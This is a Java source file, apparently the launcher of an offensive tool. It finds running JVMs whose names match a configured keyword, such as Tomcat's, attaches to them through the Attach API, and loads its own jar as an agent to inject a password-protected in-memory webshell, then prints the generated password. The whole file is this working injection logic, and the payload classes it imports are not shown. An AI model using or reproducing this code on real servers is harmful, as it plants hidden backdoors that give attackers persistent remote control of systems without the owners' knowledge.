package com.company;

import com.company.payloads.Tomcat;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.File;
import java.io.IOException;
import java.util.List;

public class Main {
    public static void main(String[] args) throws IOException {
        VirtualMachine vm;
        List<VirtualMachineDescriptor> vmList;
        String agentFile = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getCanonicalPath();
        String packageName = Tomcat.class.getPackage().getName();

        try {
            vmList = VirtualMachine.list();
            if (vmList.size() <= 0)
                return;
            for (VirtualMachineDescriptor vmd : vmList) {
                String configClass = packageName + "." + args[0];
                String jvmKey = (String) Class.forName(configClass).getField("jvmKeyword").get(Config.class);
                String password = Util.getRandomString(12);
                String agentArgs = configClass + ":" + password;

                String jvmDisplayName = vmd.displayName();
                System.out.println(vmd.displayName());
                if (jvmDisplayName.contains(jvmKey)) {
                    vm = VirtualMachine.attach(vmd);
                    //ADD for tomcat windows service,dispayname is blank string and has key "catalina.home".
//                    if (vmd.displayName().equals("")&& !vm.getSystemProperties().containsKey("catalina.home"))
//                        continue;

                    System.out.println("[+]OK.i find a jvm");
                    Thread.sleep(1000);
                    if (null != vm) {
                        vm.loadAgent(agentFile, agentArgs);
                        System.out.println("[+]memeShell is injected,password is " + password);
                        vm.detach();
                        return;
                    }
                }
            }
            Thread.sleep(3000);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}